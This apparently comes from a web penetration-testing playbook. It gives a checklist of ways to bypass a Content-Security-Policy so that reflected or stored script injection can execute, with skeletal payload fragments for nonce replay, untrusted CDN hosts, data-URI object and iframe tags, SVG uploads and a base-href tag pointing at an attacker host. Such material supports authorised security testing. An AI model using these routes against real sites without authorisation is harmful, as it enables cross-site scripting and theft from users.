# CSP Bypass Corpus

A CSP header never closes the hunt. For each reflected/stored point that reached a break,
work this list against the exact `Content-Security-Policy` value (record it verbatim as evidence).

## Read the policy first
Split directives: default-src / script-src / style-src / img-src / frame-src / object-src /
base-uri / form-action / frame-ancestors / sandbox / connect-src / worker-src.

## Bypass routes by policy shape
| Policy weakness | Route |
|---|---|
| `script-src 'unsafe-inline'` | Inline break is executable — CSP is moot for the reflected point |
| `script-src 'unsafe-hashes'` or static `sha256-...` | The hash matches a **known static string**. Find the static script the hash covers (bundle it), and if you can change what the hashed script receives (its inputs), the hash no longer protects. Record hash + matched script |
| `script-src 'nonce-...'` | Nonce reuse: is the nonce constant across responses/cached pages? Replaying a cached page with the old nonce = execution. Check `Cache-Control` on the nonce-bearing page |
| `script-src` omits a CDN domain | `<script src="https://cdn.example.com/...">` — find a script on that CDN whose source you control (open repo, upload endpoint, or path trick `//cdn/../../`) |
| `script-src` includes a permissive host you partially control | subdomain-takeover on a listed host |
| `object-src` absent or permissive | `<object data="data:text/html,...">` / `<embed src="data:...">` — SVG/Flash-style content with script |
| `base-uri` absent | `<base href="https://attacker/">` rewrites relative `<script src>` — combine with a relative-src bundle |
| `frame-src` allows `data:` or `*` | `<iframe src="data:text/html,<script>...">` (script inside the data doc still runs if that doc has no CSP) |
| `sandbox` without `allow-scripts` | sandbox blocks it — but check whether the sandboxed frame is **your break point** or an unrelated embed |
| `script-src` = self only, but the app serves **your content** (user profiles, code snippets, wiki pages) | stored HTML with inline script on a self-origin page is blocked, but `img-src self` + SVG upload, or a JSON endpoint that renders via a self script that reads your data, still executes — trace the rendering path |
| `frame-ancestors 'none'` | only stops framing attacks; irrelevant to stored/reflected script |

## The two highest-value combos (always check)
1. **`script-src self` + a self-hosted file you can influence** (upload, code snippet, profile HTML,
   generated page). The CSP "self" is the trap — self-origin is where your content lands.
2. **Cached page with nonce + stale-while-revalidate** — the nonce is only as fresh as the cache.

## Evidence format
Record: full CSP header, the weakness row that applies, the exact request proving execution
(or the static script matched to the hash), and the raw response line containing the break.
